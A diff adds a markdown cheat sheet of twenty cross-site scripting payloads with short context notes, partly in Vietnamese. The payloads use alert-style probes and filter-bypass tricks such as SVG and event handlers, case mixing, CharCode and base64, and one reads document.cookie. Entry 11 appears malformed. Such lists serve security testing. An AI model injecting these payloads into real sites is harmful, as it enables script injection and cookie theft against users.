@@ -1,0 +1,26 @@
+| # | Payload                        | Context             |
+| - | ------------------------------ | ------------------- |
+| 1 | `<script>alert(1)</script>`    | HTML body           |
+| 2 | `"><script>alert(2)</script>`  | Attribute injection |
+| 3 | `<img src=x onerror=alert(3)>` | Image onerror       |
+| 4 | `<svg/onload=alert(4)>`        | SVG onload          |
+| 5 | `'"><svg/onload=alert(5)>`     | Attribute + SVG     |
+| #  | Payload                                                    | Ghi chú                   |
+| -- | ---------------------------------------------------------- | ------------------------- |
+| 6  | `<img src=x onerror=alert('XSS')>`                         | bypass double quotes      |
+| 7  | `"><iframe src="javascript:alert(7)"></iframe>`            | iframe injection          |
+| 8  | `<body onload=alert(8)>`                                   | body tag event            |
+| 9  | `<input autofocus onfocus=alert(9)>`                       | input autofocus + onfocus |
+| 10 | `<svg><desc><![CDATA[</desc><script>alert(10)</script>]]>` | CDATA bypass              |
+| #  | Payload                                                                 | Ghi chú                       |
+| -- | ----------------------------------------------------------------------- | ----------------------------- |
+| 11 | `<svg/onload=confirm` + "`/XSS`)>`                                      | confirm popup                 |
+| 12 | `<math><mi xlink:href="javascript:alert(12)"/>`                         | MathML + JS                   |
+| 13 | `<svg><script>alert(13)</script></svg>`                                 | SVG script injection          |
+| 14 | `<video><source onerror=alert(14)></video>`                             | Video source error            |
+| 15 | `jaVasCript:alert(15)//`                                                | Mixed case JS pseudo-protocol |
+| 16 | `'><img/src/onerror=alert(String.fromCharCode(88,83,83))>`              | CharCode obfuscation          |
+| 17 | `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxNik8L3NjcmlwdD4=">` | Base64 encoded payload        |
+| 18 | `<svg/onload=alert(document.cookie)>`                                   | Cookie exfil test lab         |
+| 19 | `<details open ontoggle=alert(19)>`                                     | HTML5 details event           |
+| 20 | `<iframe srcdoc="<script>alert(20)</script>"></iframe>`                 | iframe srcdoc                 |
